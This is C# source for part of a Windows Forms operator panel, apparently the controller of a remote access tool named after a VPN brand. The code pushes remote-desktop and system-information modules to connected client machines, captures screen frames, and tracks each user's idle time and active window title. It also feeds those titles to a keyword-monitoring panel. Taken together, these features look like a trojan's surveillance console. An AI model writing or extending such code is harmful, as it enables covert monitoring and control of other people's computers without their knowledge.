using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using mullvad.Forms;
using mullvad.Modules;
using mullvad.Network;

namespace mullvad
{
    public partial class Form1
    {
        // Preview + system-info panel wiring.

        private ClientHandler?           _detailsHandler;
        private CancellationTokenSource? _previewCts;
        private CancellationTokenSource? _sysInfoCts;

        // Per-client ModuleContext for each of the two modules we need. Deliver
        // once, keep the context alive for the session.
        private readonly Dictionary<string, ModuleContext> _previewCtxCache = new();
        private readonly Dictionary<string, ModuleContext> _sysInfoCtxCache = new();

        private const string PreviewModuleFile = "mullvad.Module.RemoteDesktop";
        private const string PreviewModuleId   = "mullvad.remotedesktop";
        private const string SysInfoModuleFile = "mullvad.Module.SystemInformation";
        private const string SysInfoModuleId   = "mullvad.sysinfo";

        private void LoadDetailsForSelection()
        {
            ClientHandler? handler = null;
            if (listViewConnections.SelectedItems.Count > 0)
            {
                var id = listViewConnections.SelectedItems[0].Tag as string;
                if (id is not null) _clientHandlers.TryGetValue(id, out handler);
            }

            if (ReferenceEquals(handler, _detailsHandler)) return;
            _detailsHandler = handler;

            _previewCts?.Cancel(); _previewCts?.Dispose(); _previewCts = new CancellationTokenSource();
            _sysInfoCts?.Cancel(); _sysInfoCts?.Dispose(); _sysInfoCts = new CancellationTokenSource();

            UpdateStaticSysInfoRows(handler);
            ClearDynamicSysInfoRows();

            if (handler is null)
            {
                ClearPreview();
                return;
            }

            _ = LoadPreviewAsync(handler, _previewCts.Token);
            _ = PollSysInfoLoopAsync(handler, _sysInfoCts.Token);
        }

        private void ClearPreview()
        {
            var old = pbPreview.Image;
            pbPreview.Image = null;
            old?.Dispose();
        }

        private void SetSysInfoRow(string key, string value)
        {
            var it = lvSysInfo.Items[key];
            if (it != null && it.SubItems.Count > 1) it.SubItems[1].Text = value;
        }

        private void ClearDynamicSysInfoRows()
        {
            SetSysInfoRow("latency", "--");
            SetSysInfoRow("ram",     "--");
            SetSysInfoRow("cpu",     "--");
            SetSysInfoRow("idle",    "--");
            SetSysInfoRow("window",  "--");
        }

        private void UpdateStaticSysInfoRows(ClientHandler? h)
        {
            if (h is null)
            {
                SetSysInfoRow("compuser", "--");
                SetSysInfoRow("os",       "--");
                SetSysInfoRow("uptime",   "--");
                return;
            }

            SetSysInfoRow("compuser", $"{Trunc(h.Info.Computer, 22)}/{Trunc(h.Info.Username, 10)}");
            SetSysInfoRow("os",       string.IsNullOrEmpty(h.Info.OsEdition)
                                          ? h.Info.Os
                                          : $"{h.Info.Os} {h.Info.OsEdition}");
            SetSysInfoRow("uptime",   FormatUptime(DateTime.UtcNow - h.Info.ConnectedAt));
        }

        private static string Trunc(string s, int max)
        {
            if (string.IsNullOrEmpty(s)) return "";
            return s.Length <= max ? s : s.Substring(0, max - 1) + "…";
        }

        private static string FormatUptime(TimeSpan ts)
        {
            if (ts.TotalSeconds < 60) return $"{(int)ts.TotalSeconds} s";
            if (ts.TotalMinutes < 60) return $"{(int)ts.TotalMinutes} m";
            if (ts.TotalHours   < 24) return $"{ts.Hours}h {ts.Minutes}m";
            return $"{(int)ts.TotalDays}d {ts.Hours}h";
        }

        private static string FormatBytes(ulong bytes)
        {
            if (bytes == 0) return "0";
            if (bytes < 1024UL * 1024)          return $"{bytes / 1024.0:F0} KB";
            if (bytes < 1024UL * 1024 * 1024)   return $"{bytes / (1024.0 * 1024):F1} MB";
            return $"{bytes / (1024.0 * 1024 * 1024):F2} GB";
        }

        private static string FormatIdle(long ms)
        {
            if (ms < 0) return "--";
            var ts = TimeSpan.FromMilliseconds(ms);
            if (ts.TotalSeconds < 60) return $"{(int)ts.TotalSeconds} s";
            if (ts.TotalMinutes < 60) return $"{(int)ts.TotalMinutes} m";
            return $"{(int)ts.TotalHours} h {ts.Minutes} m";
        }

        // ── Preview snapshot ──────────────────────────────────────────────────
        private async Task LoadPreviewAsync(ClientHandler handler, CancellationToken ct)
        {
            try
            {
                await Task.Delay(250, ct).ConfigureAwait(false);

                var ctx = await GetOrDeliverCtxAsync(
                    _previewCtxCache, PreviewModuleFile, PreviewModuleId, handler, ct)
                    .ConfigureAwait(false);
                if (ctx is null || ct.IsCancellationRequested) return;

                using (var scts = CancellationTokenSource.CreateLinkedTokenSource(ct))
                {
                    scts.CancelAfter(TimeSpan.FromSeconds(8));
                    try
                    {
                        await ctx.ExecuteAsync(
                            "start_stream",
                            "{\"fps\":1,\"quality\":10,\"monitor\":0,\"cursor\":0}",
                            scts.Token).ConfigureAwait(false);
                    }
                    catch { return; }
                }

                if (ct.IsCancellationRequested) return;

                string json = "";
                for (int attempt = 0; attempt < 3 && !ct.IsCancellationRequested; attempt++)
                {
                    using var fcts = CancellationTokenSource.CreateLinkedTokenSource(ct);
                    fcts.CancelAfter(TimeSpan.FromSeconds(4));
                    try
                    {
                        json = await ctx.ExecuteAsync(
                            "get_frame",
                            "{\"fps\":1,\"quality\":10,\"cursor\":0}",
                            fcts.Token).ConfigureAwait(false);
                    }
                    catch { break; }

                    if (json.IndexOf("\"data\":\"", StringComparison.Ordinal) >= 0) break;
                }

                _ = Task.Run(async () =>
                {
                    try
                    {
                        using var ects = new CancellationTokenSource(TimeSpan.FromSeconds(3));
                        await ctx.ExecuteAsync("stop_stream", "", ects.Token);
                    }
                    catch { }
                });

                if (ct.IsCancellationRequested || IsDisposed) return;
                int idx = json.IndexOf("\"data\":\"", StringComparison.Ordinal);
                if (idx < 0) return;
                int start = idx + 8;
                int end   = json.IndexOf('"', start);
                if (end < 0) return;

                byte[] imgBytes;
                try { imgBytes = Convert.FromBase64String(json.Substring(start, end - start)); }
                catch { return; }

                Image img;
                try { img = Image.FromStream(new MemoryStream(imgBytes)); }
                catch { return; }

                if (IsDisposed || !ReferenceEquals(_detailsHandler, handler))
                {
                    img.Dispose();
                    return;
                }

                BeginInvoke(() =>
                {
                    if (IsDisposed || !ReferenceEquals(_detailsHandler, handler))
                    {
                        img.Dispose();
                        return;
                    }
                    var old = pbPreview.Image;
                    pbPreview.Image = img;
                    old?.Dispose();
                });
            }
            catch (OperationCanceledException) { }
            catch { }
        }

        // ── System info poll ──────────────────────────────────────────────────
        private async Task PollSysInfoLoopAsync(ClientHandler handler, CancellationToken ct)
        {
            try
            {
                var ctx = await GetOrDeliverCtxAsync(
                    _sysInfoCtxCache, SysInfoModuleFile, SysInfoModuleId, handler, ct)
                    .ConfigureAwait(false);
                if (ctx is null) return;

                // First tick primes the CPU % delta; the second onward reports real values.
                await OneSysInfoTickAsync(ctx, handler, ct).ConfigureAwait(false);

                while (!ct.IsCancellationRequested && ReferenceEquals(_detailsHandler, handler))
                {
                    try { await Task.Delay(2000, ct).ConfigureAwait(false); }
                    catch { break; }

                    await OneSysInfoTickAsync(ctx, handler, ct).ConfigureAwait(false);
                }
            }
            catch (OperationCanceledException) { }
            catch { }
        }

        private async Task OneSysInfoTickAsync(ModuleContext ctx, ClientHandler handler, CancellationToken ct)
        {
            string json;
            long latencyMs;
            var sw = Stopwatch.StartNew();
            try
            {
                using var cts = CancellationTokenSource.CreateLinkedTokenSource(ct);
                cts.CancelAfter(TimeSpan.FromSeconds(4));
                json = await ctx.ExecuteAsync("quick", "", cts.Token).ConfigureAwait(false);
            }
            catch { return; }
            finally { sw.Stop(); }
            latencyMs = sw.ElapsedMilliseconds;

            if (IsDisposed || !ReferenceEquals(_detailsHandler, handler)) return;

            ulong ramUsed  = (ulong)ParseLong(json, "ram_used",  0);
            ulong ramTotal = (ulong)ParseLong(json, "ram_total", 0);
            int   ramPct   = (int)  ParseLong(json, "ram_pct",   -1);
            int   cpuPct   = (int)  ParseLong(json, "cpu_pct",   -1);
            long  idleMs   =        ParseLong(json, "idle_ms",   -1);
            string window  = ParseString(json, "window") ?? "";

            BeginInvoke(() =>
            {
                if (IsDisposed || !ReferenceEquals(_detailsHandler, handler)) return;
                SetSysInfoRow("latency", $"{latencyMs} ms");
                SetSysInfoRow("ram",
                    ramTotal > 0
                        ? $"{ramPct}% {FormatBytes(ramUsed)}/{FormatBytes(ramTotal)}"
                        : "--");
                SetSysInfoRow("cpu",    cpuPct >= 0 ? $"{cpuPct}%" : "--");
                SetSysInfoRow("idle",   FormatIdle(idleMs));
                SetSysInfoRow("window", string.IsNullOrEmpty(window) ? "--" : Trunc(window, 30));
                // Keep the connection-side uptime fresh while we're here.
                SetSysInfoRow("uptime", FormatUptime(DateTime.UtcNow - handler.Info.ConnectedAt));

                // Feed window title to the keywords panel for monitoring
                if (_keywordsPanel != null && !_keywordsPanel.IsDisposed && !string.IsNullOrEmpty(window))
                    _keywordsPanel.CheckKeywords(handler.Info.Computer, window);
            });
        }

        // ── Module-context helper ─────────────────────────────────────────────
        private async Task<ModuleContext?> GetOrDeliverCtxAsync(
            Dictionary<string, ModuleContext> cache,
            string moduleFile, string moduleId,
            ClientHandler handler, CancellationToken ct)
        {
            var cacheKey = handler.Info.Id;
            if (cache.TryGetValue(cacheKey, out var cached))
                return cached;

            var bytes = ModuleLoader.GetModuleBytes(moduleFile);
            if (bytes is null) return null;

            using var dcts = CancellationTokenSource.CreateLinkedTokenSource(ct);
            dcts.CancelAfter(TimeSpan.FromSeconds(60));
            bool ok = await ModuleDelivery.EnsureDeliveredAsync(handler, moduleFile, bytes, null, dcts.Token)
                .ConfigureAwait(false);
            if (!ok || ct.IsCancellationRequested) return null;

            var ctx = new ModuleContext(handler, moduleId);
            handler.Disconnected += _ =>
            {
                cache.Remove(cacheKey);
                try { ctx.Dispose(); } catch { }
            };
            cache[cacheKey] = ctx;
            return ctx;
        }

        // ── Tiny JSON helpers (avoid pulling System.Text.Json for one blob) ────
        private static long ParseLong(string json, string key, long def)
        {
            if (string.IsNullOrEmpty(json)) return def;
            var k = "\"" + key + "\"";
            int idx = json.IndexOf(k, StringComparison.Ordinal);
            if (idx < 0) return def;
            int colon = json.IndexOf(':', idx + k.Length);
            if (colon < 0) return def;
            int s = colon + 1;
            while (s < json.Length && (json[s] == ' ' || json[s] == '\t')) s++;
            bool neg = s < json.Length && json[s] == '-';
            if (neg) s++;
            int e = s;
            while (e < json.Length && char.IsDigit(json[e])) e++;
            if (e == s) return def;
            return long.TryParse(json.Substring(s, e - s), out long v) ? (neg ? -v : v) : def;
        }

        private static string? ParseString(string json, string key)
        {
            if (string.IsNullOrEmpty(json)) return null;
            var k = "\"" + key + "\"";
            int idx = json.IndexOf(k, StringComparison.Ordinal);
            if (idx < 0) return null;
            int colon = json.IndexOf(':', idx + k.Length);
            if (colon < 0) return null;
            int s = colon + 1;
            while (s < json.Length && (json[s] == ' ' || json[s] == '\t')) s++;
            if (s >= json.Length || json[s] != '"') return null;
            s++;
            var sb = new System.Text.StringBuilder();
            for (int i = s; i < json.Length; i++)
            {
                if (json[i] == '\\' && i + 1 < json.Length)
                {
                    switch (json[++i])
                    {
                        case '"':  sb.Append('"');  break;
                        case '\\': sb.Append('\\'); break;
                        case 'n':  sb.Append('\n'); break;
                        case 'r':  sb.Append('\r'); break;
                        case 't':  sb.Append('\t'); break;
                        default:   sb.Append(json[i]); break;
                    }
                }
                else if (json[i] == '"') break;
                else sb.Append(json[i]);
            }
            return sb.ToString();
        }
    }
}
